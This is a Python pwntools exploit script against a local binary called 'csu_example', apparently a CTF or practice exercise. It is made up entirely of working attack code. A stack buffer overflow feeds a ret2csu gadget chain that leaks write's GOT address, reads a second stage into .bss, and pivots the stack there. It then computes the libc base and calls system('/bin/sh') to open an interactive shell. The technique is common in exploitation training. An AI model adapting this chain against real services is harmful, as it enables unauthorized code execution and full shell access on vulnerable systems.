from pwn import *

p = process("./csu_example")
e = ELF('./csu_example')

loc1 = 0x4006c0
loc2 = 0x4006d6

write_got = e.got['write']
read_got = e.got['read']
bss = 0x00601000 + 0x400
ret_leave = 0x00400672
pop_rdi = 0x004006e3

# write(1, write_got, 8)
payload = b'A'*0x108
payload += p64(loc2)

payload += b'B'*8
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)
payload += p64(loc1)

# read(0, bss, 0x150)

payload += b"C"*8
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(0)
payload += p64(bss)
payload += p64(0x150)
payload += p64(loc1)

# bss ret
payload += b"D"*16
payload += p64(bss)
payload += b"F"*32
payload += p64(ret_leave)

p.sendline(payload)
p.recvuntil(b"hello\n")
write_addr = u64(p.recv(8).ljust(8,b"\x00"))

libc_base = write_addr - e.libc.symbols['write']
log.info("libce_addr :" + hex(libc_base))
system_addr = libc_base + e.libc.symbols['system']
bin_sh = libc_base + 0x1b45bd

payload = b'G'*8
payload += p64(pop_rdi)
payload += p64(bin_sh)
#payload += p64(0x004004c6)
payload += p64(system_addr)

pause()
p.send(payload)

p.interactive()
